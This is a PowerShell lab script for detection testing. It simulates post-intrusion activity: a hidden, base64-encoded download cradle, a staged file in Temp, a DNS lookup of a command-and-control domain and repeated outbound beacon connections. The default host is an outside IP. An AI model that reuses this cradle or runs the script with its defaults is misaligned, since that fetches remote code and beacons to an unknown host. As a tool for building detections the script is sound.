<#
    02-post-access.ps1
    Simulates hands-on-keyboard activity after the attacker is in: an encoded PowerShell
    download cradle, a staged payload on disk, a DNS lookup, and a repeating outbound
    beacon. Produces Sysmon 1 / 3 / 11 / 22 events matching the case.

    LAB ONLY and DECLAWED. The "download" pulls a benign text file, the "payload" is an
    inert .ps1 that does nothing, and the "beacon" is a plain TCP connect to a listener
    you control. Nothing malicious executes.

    Before running: set $DownloadUrl and $C2Host/$C2Domain to hosts YOU control.
#>

param(
    [string] $C2Ip       = "185.220.101.47",              # replace with a lab listener you own
    [string] $C2Domain   = "cdn-telemetry.net",           # replace with a lab domain you own
    [int]    $C2Port     = 443,
    [string] $DownloadUrl = "http://185.220.101.47/update.ps1",  # replace with a benign file you host
    [int]    $BeaconCount    = 15,
    [int]    $BeaconInterval = 60
)

# --- Step 1: encoded PowerShell download cradle (Sysmon 1) ---------------------------
# We build a real -EncodedCommand so the command line on disk matches what the detection
# looks for. The decoded command only downloads a benign file and writes it to Temp.
$inner = @"
`$ProgressPreference='SilentlyContinue';
try { (New-Object Net.WebClient).DownloadFile('$DownloadUrl', `"`$env:TEMP\update.ps1`") } catch {}
"@
$bytes   = [System.Text.Encoding]::Unicode.GetBytes($inner)
$encoded = [Convert]::ToBase64String($bytes)

Write-Host "[*] Launching encoded PowerShell (generates Sysmon EventID 1)" -ForegroundColor Cyan
# Spawned from explorer.exe context to mimic a user paste. Sysmon records the -enc line.
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-nop -w hidden -enc $encoded" `
    -WindowStyle Hidden -Wait

# --- Step 2: confirm the staged file (Sysmon 11) -------------------------------------
$staged = Join-Path $env:TEMP "update.ps1"
if (Test-Path $staged) {
    Write-Host "[+] Payload staged at $staged (Sysmon EventID 11)" -ForegroundColor Green
} else {
    # If the download host isn't set up, drop an inert placeholder so the file-write event
    # still fires for the lab.
    "# inert lab payload - does nothing" | Out-File -FilePath $staged -Encoding ascii
    Write-Host "[i] Download host not reachable; wrote inert placeholder to $staged" -ForegroundColor DarkYellow
}

# --- Step 3: DNS lookup for the C2 domain (Sysmon 22) --------------------------------
Write-Host "[*] Resolving $C2Domain (generates Sysmon EventID 22)" -ForegroundColor Cyan
try { Resolve-DnsName -Name $C2Domain -ErrorAction Stop | Out-Null } catch {
    Write-Host "[i] DNS resolution failed (expected if $C2Domain isn't a lab domain)." -ForegroundColor DarkYellow
}

# --- Step 4: regular outbound beacon (Sysmon 3) --------------------------------------
Write-Host "[*] Beaconing to $C2Ip`:$C2Port x$BeaconCount @ ${BeaconInterval}s (Sysmon EventID 3)" -ForegroundColor Cyan
1..$BeaconCount | ForEach-Object {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($C2Ip, $C2Port)   # a plain connect is enough to generate the network event
        $client.Close()
        Write-Host "    beacon $_/$BeaconCount" -ForegroundColor DarkGray
    } catch {
        Write-Host "    beacon $_/$BeaconCount (connect failed - the event still records the attempt)" -ForegroundColor DarkGray
    }
    if ($_ -lt $BeaconCount) { Start-Sleep -Seconds $BeaconInterval }
}

Write-Host "[*] Post-access simulation complete." -ForegroundColor Cyan
